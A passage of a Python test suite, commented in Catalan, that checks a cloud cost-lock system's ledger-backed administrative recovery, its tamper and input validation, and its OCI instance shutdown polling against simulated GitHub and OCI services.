    E3. Interrupció durant la recuperació: es publica UNLOCKED al Ledger, però
    l'actualització de tags OCI falla (ex. fallada d'infraestructura).
    El procés següent manté el bloqueig perquè l'àncora OCI no s'ha actualitzat.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=110)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=110)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Lock previ")
        ev1 = backend.last_persisted_event

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": ev1["hash"],
            "ledger_event_id": ev1["event_id"]
        }
    )
    # Simulem fallada OCI en l'actualització d'etiquetes
    oci_sim.update_failure = Exception("OCI 500 Internal Service Error")

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason="Auditoria autoritzada",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )
        assert ok is False
        assert "error actualitzant Segona Àncora a OCI" in msg

        # Nou procés: el ledger té UNLOCKED, però OCI continua a LOCKED
        cold_guard = CostGuard(
            state_path=state_file,
            persistence_backend=backend,
            oci_anchor=oci_sim.freeform_tags
        )
        # Principi Fail-Closed: reinici bloquejat per manca de sincronització a OCI
        assert cold_guard.can_restart()[0] is False


def test_e2e_group_e4_replay_recovery_rejected(tmp_path, monkeypatch):
    """E4. Repetició de petició de recuperació administrativa quan ja està desbloquejat: rebutjada."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=111)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=111)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Lock 1")
        ev1 = backend.last_persisted_event

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": ev1["hash"],
            "ledger_event_id": ev1["event_id"]
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        # 1a recuperació: Èxit
        ok1, _ = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason="Auditoria autoritzada",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )
        assert ok1 is True
        assert len(gh_server.comments) == 2

        # 2a recuperació idèntica (replay): Rebutjada
        ok2, msg2 = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason="Auditoria autoritzada",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )
        assert ok2 is False
        assert "el ledger no es troba en estat LOCKED actiu" in msg2
        assert len(gh_server.comments) == 2  # Cap esdeveniment duplicat


def test_e2e_group_e5_recovery_denied_on_incomplete_data_event_id(tmp_path, monkeypatch):
    """
    E5. Dades incompletes: l'esdeveniment LOCKED previ no té un event_id vàlid (buit o whitespace).
    Verifica que execute_administrative_recovery() s'avorta abans d'escriure res a GitHub,
    no modifica l'àncora OCI i manté el bloqueig econòmic.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=115)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=115)

    # Simulem un esdeveniment LOCKED amb event_id buit al ledger
    c1 = make_event_comment(1, "valid-temp-id", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    gh_server.comments.append(c1)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": "1" * 64,
            "ledger_event_id": "valid-temp-id"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        # Forcem que el backend retorni dades de bloqueig amb event_id buit/invàlid
        with patch.object(backend, "get_state", return_value=({"locked": True, "sequence": 1, "event_id": "   "}, None)):
            ok, msg = execute_administrative_recovery(
                instance_ocid="ocid1.instance.oc1..vm",
                actor="sec-admin",
                unlock_reason="Auditoria autoritzada",
                guard=guard,
                compute_client=oci_sim,
                mock_provisioning=AUTHORIZED_BASELINE
            )
            assert ok is False
            assert "l'esdeveniment LOCKED previ no té event_id vàlid" in msg
            # No s'ha escrit cap esdeveniment UNLOCKED a GitHub
            assert len(gh_server.comments) == 1
            # L'àncora OCI es manté bloquejada
            assert oci_sim.freeform_tags["economic_lock"] == "true"
            assert oci_sim.freeform_tags["ledger_sequence"] == "1"


@pytest.mark.parametrize("inconsistency_type", ["sequence_jump", "tampered_hash"])
def test_e2e_group_e6_recovery_denied_on_inconsistent_ledger(tmp_path, monkeypatch, inconsistency_type):
    """
    E6. Ledger inconsistent:
    - Salt de seqüència (ex. seqüència 1 -> 3).
    - Hash manipulat (modificació del cos del comentari previ).
    Verifica que execute_administrative_recovery() rebutja la recuperació abans de tocar
    cap estat persistent i manté la instància en bloqueig estricte.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=116)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=116)

    c1 = make_event_comment(1, "lock-init", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]

    if inconsistency_type == "sequence_jump":
        # Esdeveniment amb salt il·legítim de seqüència (seq 3 en comptes de seq 2)
        c2 = make_event_comment(2, "lock-jump", event_type="LOCKED", sequence=3, prev_hash=h1)
        gh_server.comments.extend([c1, c2])
    else:
        # Cos manipulat que trenca la coherència del hash SHA-256
        c_corrupt = dict(c1)
        c_corrupt["body"] = c1["body"].replace("lock-init", "lock-tampered-id")
        gh_server.comments.append(c_corrupt)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-init"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        initial_comment_count = len(gh_server.comments)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason="Auditoria autoritzada",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )
        assert ok is False
        assert "error llegint el ledger persistent" in msg
        # Zero esdeveniments escrits addicionalment
        assert len(gh_server.comments) == initial_comment_count
        # Tags OCI intactes i bloqueig preservat
        assert oci_sim.freeform_tags["economic_lock"] == "true"
        assert oci_sim.freeform_tags["ledger_sequence"] == "1"


@pytest.mark.parametrize("error_mode", ["http_401", "http_403", "connection_error"])
def test_e2e_group_e7_recovery_denied_on_github_api_write_errors(tmp_path, monkeypatch, error_mode):
    """
    E7. Error d'escriptura a GitHub durant la recuperació:
    - HTTP 401 Unauthorized (token revocat o sense autenticar).
    - HTTP 403 Forbidden (token sense permisos d'escriptura a issues).
    - Error de connexió / timeout.
    Verifica que la recuperació s'avorta, no s'actualitza l'àncora OCI com si hagués
    tingut èxit i el bloqueig es conserva estrictament.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=117)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=117)

    c1 = make_event_comment(1, "lock-perm", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.append(c1)

    # Configurem la fallada d'escriptura a GitHub
    if error_mode == "http_401":
        gh_server.post_failure = urllib.error.HTTPError("https://api.github.com", 401, "Bad credentials", {}, None)
    elif error_mode == "http_403":
        gh_server.post_failure = urllib.error.HTTPError("https://api.github.com", 403, "Resource not accessible by integration", {}, None)
    else:
        gh_server.post_failure = urllib.error.URLError("Temporary name resolution failure / connection timeout")

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-perm"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason="Auditoria autoritzada",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is False
        assert "error escrivint esdeveniment UNLOCKED al ledger" in msg
        # L'àncora d'OCI NO s'ha actualitzat
        assert oci_sim.freeform_tags["economic_lock"] == "true"
        assert oci_sim.freeform_tags["ledger_sequence"] == "1"

        # Verifiquem que un procés fred posterior confirma el bloqueig
        cold_guard = CostGuard(
            state_path=state_file,
            persistence_backend=backend,
            oci_anchor=oci_sim.freeform_tags
        )
        assert cold_guard.can_restart()[0] is False


# =============================================================================
# GRUP F: Aturades OCI i cicle de vida estricte de verificació de STOPPED
# =============================================================================

def test_e2e_group_f1_watchdog_shutdown_lifecycle_stopped_confirmed(tmp_path, monkeypatch):
    """F1. Aturada confirmada amb èxit: STOP acceptat i polling arriba a STOPPED."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": "a" * 64,
            "ledger_event_id": "lock-1"
        },
        initial_state="RUNNING"
    )
    oci_sim.poll_states = ["STOPPING", "STOPPED"]

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..vm",
        config={"tenancy": "ocid1.tenancy..test"},
        return_details=True,
        poll_interval_seconds=0.01
    )
    assert res["success"] is True
    assert res["stop_accepted"] is True
    assert res["instance_stopped"] is True
    assert res["lifecycle_state"] == "STOPPED"


def test_e2e_group_f2_watchdog_shutdown_lifecycle_stuck_in_stopping(tmp_path, monkeypatch):
    """F2. STOP acceptat però la instància queda encallada a STOPPING."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={"economic_lock": "true", "ledger_sequence": "1", "ledger_hash": "a" * 64, "ledger_event_id": "l-1"},
        initial_state="STOPPING"
    )
    oci_sim.poll_states = ["STOPPING", "STOPPING", "STOPPING"]

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..vm",
        config={"tenancy": "ocid1.tenancy..test"},
        return_details=True,
        poll_interval_seconds=0.01,
        max_poll_attempts=3
    )
    assert res["success"] is False
    assert res["stop_accepted"] is True
    assert res["instance_stopped"] is False
    assert "no ha arribat a l'estat STOPPED" in res["warning"]


def test_e2e_group_f3_watchdog_shutdown_lifecycle_stuck_running(tmp_path, monkeypatch):
    """F3. STOP acceptat però la instància continua en RUNNING."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={"economic_lock": "true", "ledger_sequence": "1", "ledger_hash": "a" * 64, "ledger_event_id": "l-1"},
        initial_state="RUNNING"
    )
    oci_sim.poll_states = ["RUNNING", "RUNNING"]

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..vm",
        config={"tenancy": "ocid1.tenancy..test"},
        return_details=True,
        poll_interval_seconds=0.01,
        max_poll_attempts=2
    )
    assert res["success"] is False
    assert res["instance_stopped"] is False
    assert res["lifecycle_state"] == "RUNNING"


def test_e2e_group_f4_watchdog_shutdown_lifecycle_response_without_data(tmp_path, monkeypatch):
    """F4. Resposta de polling sense camp data o buida: mai STOPPED."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={"economic_lock": "true", "ledger_sequence": "1", "ledger_hash": "a" * 64, "ledger_event_id": "l-1"}
    )
    # Sobreescrivim get_instance per retornar objecte buit
    class EmptyResponse:
        data = None
        headers = {"etag": "e"}

    oci_sim.get_instance = lambda ocid: EmptyResponse()

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..vm",
        config={"tenancy": "ocid1.tenancy..test"},
        return_details=True,
        poll_interval_seconds=0.01,
        max_poll_attempts=2
    )
    assert res["success"] is False
    assert res["instance_stopped"] is False
    assert res["lifecycle_state"] is None


def test_e2e_group_f5_watchdog_shutdown_lifecycle_polling_exception(tmp_path, monkeypatch):
    """F5. Excepció durant el polling de verificació."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    calls = []

    class MockComputePollingError:
        def get_instance(self, ocid):
            calls.append("get")
            if len(calls) == 1:
                class ValidResponse:
                    data = MagicMock(freeform_tags={"economic_lock": "true", "ledger_sequence": "1", "ledger_hash": "a" * 64, "ledger_event_id": "l-1"})
                    headers = {"etag": "e"}
                return ValidResponse()
            raise ConnectionResetError("OCI gateway timeout during polling")

        def update_instance(self, ocid, details, if_match=None):
            return MagicMock(status=200)

        def instance_action(self, ocid, action):
            return MagicMock(status=200)

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: MockComputePollingError()
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..vm",
        config={"tenancy": "ocid1.tenancy..test"},
        return_details=True,
        poll_interval_seconds=0.01,
        max_poll_attempts=2
    )
    assert res["success"] is False
    assert res["instance_stopped"] is False


def test_e2e_group_f6_watchdog_shutdown_lifecycle_unknown_state(tmp_path, monkeypatch):
    """F6. Estat retornat desconegut (ex. 'PROVISIONING'): mai STOPPED."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={"economic_lock": "true", "ledger_sequence": "1", "ledger_hash": "a" * 64, "ledger_event_id": "l-1"},
        initial_state="PROVISIONING"
    )
    oci_sim.poll_states = ["PROVISIONING"] * 10

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..vm",
        config={"tenancy": "ocid1.tenancy..test"},
        return_details=True,
        poll_interval_seconds=0.01,
        max_poll_attempts=2
    )
    assert res["success"] is False
    assert res["instance_stopped"] is False
    assert res["lifecycle_state"] == "PROVISIONING"


def test_e2e_group_f7_watchdog_shutdown_lifecycle_dry_run():
    """F7. Mode Dry-Run: no s'afirma cap operació física real."""
    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..simulated",
        config={"tenancy": "ocid1.tenancy..test"},
        dry_run=True,
        return_details=True
    )
    assert res["is_dry_run"] is True
    assert res["simulation_success"] is True
    assert res["success"] is False
    assert res["stop_accepted"] is False
    assert res["instance_stopped"] is False
    assert res["lifecycle_state"] is None


def test_e2e_group_f8_watchdog_shutdown_lifecycle_missing_credentials():
    """F8. Absència de credencials OCI: no es pot executar ni afirmar l'aturada."""
    res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..vm",
        config={"tenancy": None},
        return_details=True
    )
    assert res["success"] is False
    assert res["stop_accepted"] is False
    assert res["instance_stopped"] is False
    assert "No s'ha pogut obtenir el signer" in res["error"]


# =============================================================================
# GRUP G: Idempotència i execucions repetides
# =============================================================================

def test_e2e_group_g1_idempotent_evaluations_do_not_duplicate_events(tmp_path):
    """G1. Avaluacions repetides mentre el sistema està bloquejat no generen esdeveniments infinits."""
    state_file = tmp_path / "state.json"
    gh_server = SimulatedGitHubLedgerServer(issue_number=112)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=112)

    # Esdeveniment inicial legítim a seqüència 1 (LOCKED) i seqüència 2 (UNLOCKED)
    c1 = make_event_comment(1, "lock-g1-0", event_type="LOCKED", sequence=1, prev_hash="GENESIS", lock_reason="Init lock")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    c2 = make_event_comment(2, "unlock-g1-0", event_type="UNLOCKED", sequence=2, prev_hash=h1, resolves_lock_id="lock-g1-0", actor="admin", workflow_run_id="wf-g1", unlock_reason="Init unlock")
    gh_server.comments.extend([c1, c2])

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        assert guard.persistence_status == "OK"
        rogue_prov = dict(AUTHORIZED_BASELINE)
        rogue_prov["shape"] = "VM.Standard3.Flex"

        # 1a avaluació: activa el bloqueig i genera el comentari LOCKED al ledger (seqüència 3)
        guard.evaluate(current_provisioning=rogue_prov, uptime_hours=744.0)
        assert len(gh_server.comments) == 3
        assert guard.state["restart_locked"] is True

        # 4 avaluacions consecutives addicionals
        for _ in range(4):
            summary = guard.evaluate(current_provisioning=rogue_prov, uptime_hours=744.0)
            assert summary["status"] in ("PREVENTIVE_SHUTDOWN", "RESTART_LOCKED")

        # Comprovem que no s'ha generat cap comentari addicional redundant
        assert len(gh_server.comments) == 3


def test_e2e_group_g2_repeated_watchdog_runs_maintain_integrity(tmp_path, monkeypatch):
    """G2. Execucions repetides del vigilant sobre una VM ja aturada mantenen la integritat i no retrocedeixen."""
    state_file, summary_file = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=113)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=113)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Lock G2")
        ev = backend.last_persisted_event

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": ev["hash"],
            "ledger_event_id": ev["event_id"]
        },
        initial_state="STOPPED"
    )

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)
    monkeypatch.setattr("scripts.oci_external_watchdog.CostGuard", lambda *a, **kw: guard)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        for run_idx in range(3):
            res = run_watchdog(
                mode="fast",
                instance_ocid="ocid1.instance.oc1..vm",
                dry_run=False
            )
            assert res["watchdog_ok"] is True
            assert res["can_restart"] is False
            assert oci_sim.freeform_tags["economic_lock"] == "true"
            assert oci_sim.freeform_tags["ledger_sequence"] == "1"


def test_e2e_group_g3_repeated_reconciliation_deterministic(tmp_path):
    """G3. Reconciliacions repetides amb la mateixa àncora OCI són pures i deterministes."""
    state_file = tmp_path / "state.json"
    gh_server = SimulatedGitHubLedgerServer(issue_number=114)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=114)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Lock G3")
        ev = backend.last_persisted_event

    oci_anchor = {
        "economic_lock": "true",
        "ledger_sequence": "1",
        "ledger_hash": ev["hash"],
        "ledger_event_id": ev["event_id"]
    }

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        for _ in range(5):
            coherent, err = guard.reconcile_with_oci_anchor(oci_anchor)
            assert coherent is True
            assert err is None
            assert guard.state["status"] == "RESTART_LOCKED"
            assert guard.can_restart()[0] is False


# =============================================================================
# GRUP E (CONTINUACIÓ): VALIDACIÓ ESTRICTA DE METADADES D'AUDITORIA
# =============================================================================

@pytest.mark.parametrize("invalid_actor", [None, "", "   ", 123, ["admin"], {"user": "admin"}])
def test_e2e_group_e8_recovery_denied_on_invalid_actor(tmp_path, monkeypatch, invalid_actor):
    """
    E8. Validació estricta de 'actor':
    - None, cadena buida, pur whitespace o tipus no string.
    Verifica que execute_administrative_recovery() rebutja la recuperació immediatament
    a la Fase 0 abans de tocar el Ledger o OCI, i manté el bloqueig econòmic.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=120)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=120)

    c1 = make_event_comment(1, "lock-e8", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.append(c1)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-e8"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor=invalid_actor,
            unlock_reason="Motiu legítim d'auditoria",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is False
        assert "actor" in msg.lower()
        # Cap escriptura al Ledger
        assert len(gh_server.comments) == 1
        # Àncora OCI roman bloquejada
        assert oci_sim.freeform_tags["economic_lock"] == "true"
        assert oci_sim.freeform_tags["ledger_sequence"] == "1"
        # Estat local manté el bloqueig
        assert guard.can_restart()[0] is False


@pytest.mark.parametrize("invalid_reason", [None, "", "   ", 456, ["reason"], {}])
def test_e2e_group_e9_recovery_denied_on_invalid_unlock_reason(tmp_path, monkeypatch, invalid_reason):
    """
    E9. Validació estricta de 'unlock_reason':
    - None, cadena buida, pur whitespace o tipus no string.
    Verifica que la petició es rebutja abans d'escriure res al Ledger o actualitzar tags OCI.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=121)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=121)

    c1 = make_event_comment(1, "lock-e9", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.append(c1)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-e9"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason=invalid_reason,
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is False
        assert "unlock_reason" in msg.lower()
        assert len(gh_server.comments) == 1
        assert oci_sim.freeform_tags["economic_lock"] == "true"
        assert guard.can_restart()[0] is False


@pytest.mark.parametrize("invalid_run_id", [
    None, "", "   ", "manual", "MANUAL", "  manual  ", "abc", "123abc", "-1", "0", "²", "١٢٣", []
])
def test_e2e_group_e10_recovery_github_actions_workflow_run_id_validation(tmp_path, monkeypatch, invalid_run_id):
    """
    E10. Validació estricta de 'workflow_run_id' a GitHub Actions:
    - En entorn GitHub Actions (GITHUB_ACTIONS=true), només s'accepta un enter ASCII estrictament positiu ([0-9]+ i > 0).
    - Es rebutgen: None, "", whitespace, "manual", "abc", "123abc", "-1", "0", caràcters especials/exponents ("²"),
      dígits Unicode no ASCII ("١٢٣") i tipus no vàlids.
    """
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=122)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=122)

    c1 = make_event_comment(1, "lock-e10", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.append(c1)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-e10"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason="Auditoria formal en PR",
            workflow_run_id=invalid_run_id,
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is False
        assert "workflow_run_id" in msg.lower()
        assert "github actions" in msg.lower()
        assert len(gh_server.comments) == 1
        assert oci_sim.freeform_tags["economic_lock"] == "true"
        assert guard.can_restart()[0] is False


def test_e2e_group_e11_recovery_cli_local_generates_unique_id(tmp_path, monkeypatch):
    """
    E11. Recuperació legítima en CLI local (fora de GitHub Actions):
    - Si no es proporciona workflow_run_id, se'n genera un d'únic 'cli-local-<ts>-<uuid>'.
    - L'operació es completa amb èxit i s'escriu UNLOCKED amb aquest identificador.
    """
    monkeypatch.delenv("GITHUB_ACTIONS", raising=False)
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=123)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=123)

    c1 = make_event_comment(1, "lock-e11", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.append(c1)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-e11"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="local-sysadmin",
            unlock_reason="Intervenció local urgent d'infraestructura",
            workflow_run_id=None,
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is True
        assert "completada amb èxit" in msg
        assert len(gh_server.comments) == 2

        # Comprovem el segon comentari (UNLOCKED)
        c2 = gh_server.comments[1]
        ev2 = json.loads(c2["body"].split("```json")[1].split("```")[0])
        assert ev2["event_type"] == "UNLOCKED"
        assert ev2["actor"] == "local-sysadmin"
        assert ev2["unlock_reason"] == "Intervenció local urgent d'infraestructura"
        assert ev2["workflow_run_id"].startswith("cli-local-")
        # Tags OCI actualitzats
        assert oci_sim.freeform_tags["economic_lock"] == "false"
        assert oci_sim.freeform_tags["ledger_sequence"] == "2"


@pytest.mark.parametrize("valid_run_id", ["9876543210", "12345", 54321])
def test_e2e_group_e12_recovery_legitimate_github_actions(tmp_path, monkeypatch, valid_run_id):
    """
    E12. Recuperació legítima des de GitHub Actions simulat:
    - Amb actor, unlock_reason no buits i workflow_run_id numèric vàlid de GitHub Actions (ex. '12345', '9876543210').
    - S'executa amb èxit i s'escriu UNLOCKED amb les metadades exactes.
    """
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=124)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=124)

    c1 = make_event_comment(1, "lock-e12", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
